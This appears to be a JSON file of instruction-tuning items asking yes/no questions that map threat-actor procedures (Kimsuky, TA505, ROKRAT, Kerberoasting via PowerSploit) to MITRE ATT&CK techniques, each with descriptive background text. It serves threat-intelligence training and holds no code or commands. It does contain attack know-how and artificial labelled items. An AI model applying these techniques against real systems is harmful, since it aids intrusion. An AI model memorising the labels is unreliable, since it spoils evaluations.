    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688. a type of technique Exploit Public-Facing Application",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exploit Public-Facing Application: Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets. Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
      "question": "Is procedure Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688. a type of technique Exploit Public-Facing Application",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure LiteDuke can securely delete files by first writing random data to the file. a type of technique Scheduled Task/Job: Scheduled Task.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure LiteDuke can securely delete files by first writing random data to the file. a type of technique Scheduled Task/Job: Scheduled Task",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Dynamic Resolution: Fast Flux DNS: Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel..\nAnswer in Yes or No.\n\nQuestion: Is procedure TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs.  related to technique Dynamic Resolution: Fast Flux DNS",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Dynamic Resolution: Fast Flux DNS: Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
      "question": "Is procedure TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs.  related to technique Dynamic Resolution: Fast Flux DNS",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure PowerSploit's <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes. a type of technique Proxy: Internal Proxy",
    "context": "",
    "output": "No.\nThe provided context is correlated with Steal or Forge Kerberos Tickets: Kerberoasting",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Steal or Forge Kerberos Tickets: Kerberoasting: Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
      "question": "Is procedure PowerSploit's <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes. a type of technique Proxy: Internal Proxy",
      "yes/no": "No.\nThe provided context is correlated with Steal or Forge Kerberos Tickets: Kerberoasting",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Audio Capture: An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later..\nAnswer in Yes or No.\n\nQuestion: Is procedure ROKRAT has an audio capture and eavesdropping module.  related to technique Develop Capabilities: Malware",
    "context": "",
    "output": "No.\nThe correct answer is Audio Capture",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Audio Capture: An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
      "question": "Is procedure ROKRAT has an audio capture and eavesdropping module.  related to technique Develop Capabilities: Malware",
      "yes/no": "No.\nThe correct answer is Audio Capture",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure AuditCred can utilize proxy for communications.  related to technique Proxy.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Proxy: Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
      "question": "Is procedure AuditCred can utilize proxy for communications.  related to technique Proxy",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic..\nQ: Is procedure During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners. a type of technique Application Layer Protocol: Mail Protocols.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Application Layer Protocol: Web Protocols",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure During Operation CuckooBees, the threat actors enabled HTTP and HTTPS listeners. a type of technique Application Layer Protocol: Mail Protocols",
      "yes/no": "No.\nThe provided context is related to Application Layer Protocol: Web Protocols",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Rclone can exfiltrate data over FTP or HTTP, including HTTP via WebDAV.  related to technique Credentials from Password Stores: Credentials from Web Browsers",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol: Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
      "question": "Is procedure Rclone can exfiltrate data over FTP or HTTP, including HTTP via WebDAV.  related to technique Credentials from Password Stores: Credentials from Web Browsers",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Archive Collected Data: Archive via Utility: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities..\nQ: Is procedure Ke3chang is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration. a type of technique Windows Management Instrumentation.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Archive Collected Data: Archive via Utility",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Archive Collected Data: Archive via Utility: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
      "question": "Is procedure Ke3chang is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration. a type of technique Windows Management Instrumentation",
      "yes/no": "No.\nThe provided context is correlated with Archive Collected Data: Archive via Utility",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  }
]